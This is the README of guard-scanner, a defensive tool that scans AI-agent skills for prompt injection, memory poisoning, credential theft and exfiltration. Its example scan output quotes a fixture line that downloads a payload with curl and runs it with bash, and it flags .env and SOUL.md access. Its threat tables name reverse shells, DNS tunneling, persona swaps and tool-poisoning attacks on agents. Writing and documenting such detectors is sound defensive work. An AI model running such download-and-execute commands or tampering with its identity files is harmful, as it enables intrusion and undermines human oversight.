# guard-scanner 🛡️

*The Original, Zero-Dependency Shield for the AI Agent Era.*

As autonomous AI agents become more prevalent, the risk of executing untrusted or malicious skills increases. **guard-scanner** is an open-source, zero-dependency static and runtime security scanner designed to help protect developers' local machines from Prompt Injections, RCEs, and Memory Poisoning.

Built collaboratively by the **[Guava Parity Institute](https://github.com/koatora20)** and the open-source community. We believe that AI safety infrastructure should be a shared, transparent, and accessible resource for everyone. We welcome contributions, feedback, and discussion from all developers!

**144+ static patterns + 26 runtime checks** across **22 threat categories**.

[![npm](https://img.shields.io/npm/v/@guava-parity/guard-scanner)](https://www.npmjs.com/package/@guava-parity/guard-scanner)
[![license](https://img.shields.io/npm/l/@guava-parity/guard-scanner)](LICENSE)

## Install

```bash
npm install -g @guava-parity/guard-scanner
```

> **Why use this?** If you are experimenting with third-party skills for your AI agents, `guard-scanner` acts as a basic safety net, helping to identify hidden prompts or dangerous execution patterns.
> 
> 🤝 **We need your help!**: The landscape of Agentic AI threats is evolving rapidly. We are maintaining this project out of goodwill to provide a baseline defense, but we rely on community contributions to keep our pattern database updated. If you find a false positive or a new threat vector, please consider opening an issue or a pull request!

## Quick Start

```bash
# Scan all skills
guard-scanner ./skills/ --verbose

# Strict mode + reports
guard-scanner ./skills/ --strict --json --sarif --fail-on-findings

# CI/CD pipeline (stdout)
guard-scanner ./skills/ --format sarif --quiet | upload-sarif
```

## 🔍 Example Scan Output

This is actual output from scanning a malicious test skill demonstrating data exfiltration, memory poisoning, and credential theft:

```console
$ guard-scanner ./test/fixtures/malicious-skill/ --verbose

🛡️  guard-scanner v4.0.1
══════════════════════════════════════════════════════
📂 Scanning: ./test/fixtures/malicious-skill/
📦 Skills found: 1

🔴 scripts — MALICIOUS (risk: 100)
   📁 exfiltration
      🔴 [HIGH] Suspicious domain: webhook.site — evil.js
   📁 malicious-code
      🔴 [HIGH] eval() call — evil.js:18
      💀 [CRITICAL] Shell download/execution — stealer.js:19
         └─ "exec(`curl https://91.92.242.30/payload -o /tmp/x && bash"
   📁 credential-handling
      🔴 [HIGH] Credential file read — evil.js:6
         └─ "readFileSync('.env"
      💀 [CRITICAL] Agent identity file read — evil.js:7
         └─ "readFileSync('SOUL.md"
   📁 memory-poisoning
      💀 [CRITICAL] Write to agent soul file — evil.js:21
         └─ "writeFileSync('SOUL.md"
   📁 data-flow
      💀 [CRITICAL] Data flow: secret read (L6) → network call (L10) — evil.js:6

══════════════════════════════════════════════════════
📊 guard-scanner Scan Summary
──────────────────────────────────────────────────────
   Scanned:      1
   🟢 Clean:       0
   🔴 Malicious:   1
   Safety Rate:  0%
══════════════════════════════════════════════════════
⚠️  CRITICAL: 1 malicious skill(s) detected!
```

## 🚀 Standalone Architecture

**guard-scanner** is designed as a foundational "Shield" for the OpenClaw ecosystem. 
It features a **Standalone Boot Sequence**:
- **Zero API/DB Dependencies**: It initializes purely from local, static Threat Patterns (144+ regex rules) defined in its codebase.
- **No Heavy Context Loading**: It does *not* require loading heavy memory databases or executing contextual commands.
- **Privacy First**: It never accesses or exposes your agent's private memory during the boot phase.

This lightweight initialization makes it perfect for zero-trust environments, ensuring complete safety without exposing proprietary agent logic.

## Options

| Flag | Description |
|------|-------------|
| `--verbose`, `-v` | Detailed findings with categories and samples |
| `--strict` | Lower detection thresholds (more sensitive) |
| `--check-deps` | Scan `package.json` for dependency chain risks |
| `--soul-lock` | Enable agent identity protection (SOUL.md/MEMORY.md patterns) |
| `--json` | Write JSON report to file |
| `--sarif` | Write SARIF 2.1.0 report (GitHub Code Scanning) |
| `--html` | Write HTML dashboard report |
| `--format json\|sarif` | Print to stdout (pipeable) |
| `--quiet` | Suppress text output (use with `--format`) |
| `--self-exclude` | Skip scanning guard-scanner itself |
| `--summary-only` | Only print the summary table |
| `--rules <file>` | Load custom detection rules (JSON) |
| `--plugin <file>` | Load plugin module |
| `--fail-on-findings` | Exit code 1 if any findings (CI/CD) |

## Threat Categories (22)

| # | Category | Detects |
|---|----------|---------|
| 1 | Prompt Injection | Hidden instructions, invisible Unicode, homoglyphs, XML tag injection |
| 2 | Malicious Code | `eval()`, `child_process`, reverse shells, raw sockets |
| 3 | Suspicious Downloads | `curl\|bash`, executable downloads, password-protected archives |
| 4 | Credential Handling | `.env` reads, SSH keys, sudo in instructions |
| 5 | Secret Detection | Hardcoded API keys, AWS keys, GitHub tokens, Shannon entropy |
| 6 | Exfiltration | webhook.site, DNS tunneling, curl data exfil |
| 7 | Unverifiable Deps | Remote dynamic imports |
| 8 | Financial Access | Crypto transactions, payment APIs |
| 9 | Obfuscation | Base64→exec, hex encoding, `String.fromCharCode` |
| 10 | Prerequisites Fraud | Fake download/paste instructions |
| 11 | Leaky Skills | Secrets saved in agent memory, verbatim in commands |
| 12 | Memory Poisoning ⚿ | SOUL.md/MEMORY.md modification, behavioral rule override |
| 13 | Prompt Worm | Self-replicating prompts, agent-to-agent propagation |
| 14 | Persistence | Cron, launchd, startup execution |
| 15 | CVE Patterns | CVE-2026-25253 (RCE), sandbox disabling, Gatekeeper bypass |
| 16 | MCP Security | Tool/schema poisoning, SSRF, shadow server registration |
| 16b | Trust Boundary | Calendar/email/web → code execution chains |
| 16c | Advanced Exfiltration | ZombieAgent static URL arrays, drip exfil, beacon |
| 16d | Safeguard Bypass | URL parameter injection, retry-on-block |
| 17 | Identity Hijacking ⚿ | SOUL.md overwrite, persona swap, memory wipe |
| 18 | Config Impact | `openclaw.json` writes, exec approval disabling |
| 19 | PII Exposure | Hardcoded CC/SSN, PII logging, Shadow AI API calls |
| 20 | Trust Exploitation | Authority claims, creator impersonation, fake audits |

> ⚿ = Requires `--soul-lock` flag (opt-in)

## Runtime Guard (26 checks, 5 layers)

Real-time `before_tool_call` hook that blocks dangerous operations.

| Layer | Name | Checks |
|-------|------|--------|
| 1 | Threat Detection | Reverse shell, curl\|bash, SSRF, credential exfil |
| 2 | Trust Defense | SOUL.md tampering, memory injection |
| 3 | Safety Judge | Prompt injection in tool args, trust bypass |
| 4 | Behavioral | No-research execution |
| 5 | Trust Exploitation (ASI09) | Authority claim, creator bypass, fake audit |

```bash
# Install as OpenClaw hook
openclaw hooks install skills/guard-scanner/hooks/guard-scanner
openclaw hooks enable guard-scanner
```

Modes: `monitor` (log only) / `enforce` (block CRITICAL) / `strict` (block HIGH+CRITICAL)



## OWASP Mapping

- **OWASP LLM Top 10 2025**: LLM01–LLM10 fully mapped
- **OWASP Agentic Security Top 10**: ASI01–ASI10 coverage (tested)

## Test Results

```
ℹ tests 134
ℹ suites 24
ℹ pass 134
ℹ fail 0
ℹ duration_ms 171
```

| Suite | Tests |
|-------|-------|
| Malicious Skill Detection | 16 ✅ |
| Clean Skill (False Positive) | 2 ✅ |
| Risk Score Calculation | 5 ✅ |
| Verdict Determination | 5 ✅ |
| Output Formats (JSON/SARIF/HTML) | 4 ✅ |
| Pattern Database (135 patterns, 22 categories) | 4 ✅ |
| IoC Database | 5 ✅ |
| Shannon Entropy | 2 ✅ |
| Ignore Functionality | 1 ✅ |
| Plugin API | 1 ✅ |
| Skill Manifest Validation | 4 ✅ |
| Code Complexity Metrics | 2 ✅ |
| Report Noise Regression | 2 ✅ |
| Config Impact Analysis | 4 ✅ |
| PII Exposure Detection | 8 ✅ |
| OWASP Agentic Security (ASI01–10) | 14 ✅ |
| Runtime Guard (5 layers, 26 checks) | 23 ✅ |

## Plugin API

```javascript
// my-plugin.js
module.exports = {
  name: 'my-plugin',
  patterns: [
    { id: 'MY_01', cat: 'custom', regex: /pattern/g, severity: 'HIGH', desc: 'Description', all: true }
  ]
};
```

```bash
guard-scanner ./skills/ --plugin ./my-plugin.js
```

## Custom Rules (JSON)

```json
[
  {
    "id": "CUSTOM_001",
    "pattern": "dangerous_function\\(",
    "flags": "gi",
    "severity": "HIGH",
    "cat": "malicious-code",
    "desc": "Custom: dangerous function call",
    "codeOnly": true
  }
]
```

```bash
guard-scanner ./skills/ --rules ./my-rules.json
```

## Output Formats

- **Terminal** — Color-coded verdicts with risk scores
- **JSON** — Machine-readable report (`--json`)
- **SARIF 2.1.0** — GitHub Code Scanning / CI/CD (`--sarif`)
- **HTML** — Visual dashboard (`--html`)
- **stdout** — Pipeable output (`--format json|sarif --quiet`)

## Contributing

We wholeheartedly welcome contributions! Guard-scanner is built on community knowledge. 

Whether you're fixing a bug, adding a new threat pattern, or simply improving the documentation, your help is deeply appreciated. Please see our [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to get started.

## Code of Conduct

We are committed to fostering a welcoming, respectful, and harassment-free environment. Please read our [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) before participating in our community.

## License

MIT — [Guava Parity Institute](https://github.com/koatora20/guard-scanner)
